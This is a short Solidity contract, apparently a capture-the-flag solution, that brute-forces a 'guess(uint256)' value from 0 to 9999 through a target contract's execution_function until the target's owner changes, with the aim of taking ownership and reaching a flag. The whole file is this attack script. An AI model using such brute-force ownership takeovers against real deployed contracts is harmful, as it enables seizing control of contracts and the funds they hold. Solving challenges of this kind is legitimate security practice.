// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGuess {
    function flag() external view returns (string memory);
    function number_flag() external view returns (uint256);
    function owner() external view returns (address);
    function n() external view returns (address);
    function getFlag() external view returns (string memory);
    function execution_function(bytes memory _data) external;
}

contract ContractA {
    address public contractB;
    address public owner2 =0x1aF87dD5E75E36BdedF8d72eA81ebf4282d67539;
    address public owner;
    uint256 public i = 0;
    event LogInfo( bytes value);
    IGuess public contrato; // Declaración de la instancia del contrato IGuess
    
    constructor(address _contractB) {
        contractB = _contractB;
        contrato = IGuess(_contractB); // Creación de la instancia del contrato IGuess
        owner = msg.sender;
    }
    function getEncodeWithSelector(uint256 numero) pure public returns(bytes memory){
        bytes memory data = abi.encodeWithSignature("guess(uint256)",numero);
        return data;
    }
    function bruteForceGuess() public returns (string memory) {

        while (i <= 9999) {
            bytes memory data2 = getEncodeWithSelector(i);
            emit LogInfo(data2);
            contrato.execution_function(data2); 
            address contratoOwner = contrato.owner();
        
            if (contratoOwner != owner2){
                return "Adivinado correctamente"; 
            } else {
                i++; 
            }
        }

        return "hola"; // La búsqueda ha terminado sin éxito
    }


}
